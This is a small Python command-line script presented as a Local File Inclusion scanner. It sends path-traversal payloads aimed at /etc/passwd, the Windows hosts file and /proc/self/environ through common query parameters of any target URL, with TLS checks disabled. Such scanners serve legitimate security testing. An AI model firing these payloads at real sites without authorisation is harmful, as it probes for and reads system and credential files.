#!/usr/bin/env python3
"""
LFI (Local File Inclusion) Scanner
Detects LFI vulnerabilities
"""

import requests
import argparse
import warnings
warnings.filterwarnings('ignore')

PAYLOADS = [
    ("../../../../../../../../etc/passwd", "etc/passwd"),
    ("..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "windows hosts"),
    ("....//....//....//etc/passwd", "double dot"),
    ("..%2F..%2F..%2F..%2Fetc%2Fpasswd", "encoding"),
    ("/etc/passwd", "absolute"),
    ("%00", "null byte"),
    ("../../../../../../../../proc/self/environ", "proc environ"),
]

def scan(target):
    print(f"[*] LFI Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    found = []
    params = ['file', 'page', 'path', 'include', 'doc', 'template', 'view', 'dir', 'folder', 'pg', 'style', 'doc', 'img', 'filename']
    
    for param in params:
        for payload, ptype in PAYLOADS[:3]:
            try:
                r = requests.get(target, params={param: payload}, timeout=10, verify=False)
                if 'root:' in r.text or 'daemon:' in r.text or '[boot loader]' in r.text:
                    print(f"[!] LFI: {param} ({ptype})")
                    found.append({'param': param, 'type': ptype})
            except:
                pass
    
    print("\n" + "="*50)
    if found:
        print(f"[!] Found {len(found)} potential LFI issues")
    else:
        print("[*] No LFI vulnerabilities detected")
    
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='LFI Scanner')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)